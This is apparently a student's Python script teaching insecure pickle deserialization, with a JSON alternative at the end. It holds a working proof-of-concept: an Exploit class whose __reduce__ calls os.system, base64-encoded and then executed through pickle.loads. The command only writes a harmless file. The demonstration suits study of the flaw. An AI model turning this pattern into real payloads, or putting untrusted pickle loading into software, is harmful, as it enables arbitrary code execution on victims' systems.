"""
it's use opcode to tell pickle what have to do
pickle stream 0: \x80 PROTO      4
    2: \x95 FRAME      43
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x8c SHORT_BINUNICODE 'system'
   26: \x93 STACK_GLOBAL
   27: \x8c SHORT_BINUNICODE 'echo HACKED > pwned.txt'
   51: \x85 TUPLE1
   52: R    REDUCE
   53: .    STOP
   _____________________

   what is opcode the part of a computer instruction that tells the processor what basic task to do, like add numbers, move data, or stop

   _______


"""




import pickle
import base64
import os
import json


class Exploit:
    def __reduce__(self):
        return (
            os.system,
            ("echo HACKED > pwned.txt",)
        )

payload = pickle.dumps(Exploit())

print(f"seriliazation means convet data from object to trasportable format:\nthe row format from pickle.dumps {payload}")
encode_payload=base64.b64encode(payload)
print(f"\nthen encode with b64 and send to user: {encode_payload.decode()}")



print(" ")
print("_"*33)
print(" ")
class UserProfile:
    def __init__(self):
        self.username = "p0nther"
        self.role = "admin"
        self.active = True

# Create a normal object instance


user=pickle.dumps(UserProfile())
print(f"serilization from obj user to transportabe format \nthe row data from pickle.dumps : {user}")
encode_user=base64.b64encode(user)
print(f"encode for user present: {encode_user.decode()}")



print(" ")
print("_"*33)
print(" ")
print("now let's deserilize: ")

de_payload=pickle.loads(base64.b64decode(encode_payload))
#print(f"Deserlize the payload: {de_payload.__dict__}")

de_user=pickle.loads(base64.b64decode(encode_user))
print(f"Deserlize the user: {de_user.__dict__}")


print("__________________FIXED-JSON____________________________")

fixed= UserProfile()
fixed.username="p0nther fix| json"
fixed.role="admin| json"

serial_json=json.dumps(fixed.__dict__)
Deserial_json=json.loads(serial_json)

print(f"save serial-json: {serial_json}")
print(f"save Deserial-json: {repr(Deserial_json)}")
